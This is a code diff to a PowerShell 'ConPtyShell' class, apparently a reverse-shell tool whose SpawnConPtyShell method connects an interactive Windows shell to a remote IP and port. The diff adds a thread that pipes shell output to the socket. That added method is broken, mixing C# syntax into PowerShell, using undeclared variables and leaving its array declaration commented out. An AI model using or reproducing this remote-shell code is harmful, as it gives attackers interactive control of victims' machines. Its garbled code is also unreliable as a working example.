@@ -1026,6 +1026,20 @@ class ConPtyShell {
         $Kernel32::SetStdHandle([ConPtyShell]::STD_INPUT_HANDLE, $hStdin);
     }
 
+    hidden static [System.Threading.Thread] StartThreadReadPipeWriteSocket([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket, [bool] $overlappedSocket)
+    {
+        #object[] threadParameters = new object[2];
+        
+        threadParameters[0] = OutputPipeRead;
+        threadParameters[1] = shellSocket;
+        Thread thThreadReadPipeWriteSocket;
+        if(overlappedSocket)
+            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketOverlapped);
+        else
+            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
+        thThreadReadPipeWriteSocket.Start(threadParameters);
+        return thThreadReadPipeWriteSocket;
+    }
 
     static [string] SpawnConPtyShell([string] $remoteIp, [uint32] $remotePort, [uint32] $rows, [uint32] $cols, [string] $commandLine, [bool] $upgradeShell) {
 
@@ -1108,9 +1122,13 @@ class ConPtyShell {
             if ($parentSocketInherited) {$ntdll::NtSuspendProcess($parentProcess.Handle)}
             if ($grandParentSocketInherited) {$ntdll::NtSuspendProcess($grandParentProcess.Handle)}
             if (! $IsSocketOverlapped) {
-                Write-Host "Todo!" -ForegroundColor Yellow
+                Write-Host "Todo!" -ForegroundColor Yellow # TODO
             }
         }
+        # Thread have better perfornace than Tasks
+        [System.Threading.Thread] $thThreadReadPipeWriteSocket = [ConPtyShell]::StartThreadReadPipeWriteSocket($OutputPipeRead, $shellSocket, $IsSocketOverlapped)
+
+
 
         $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
         Write-Host "Err msg: " $LastError.Message
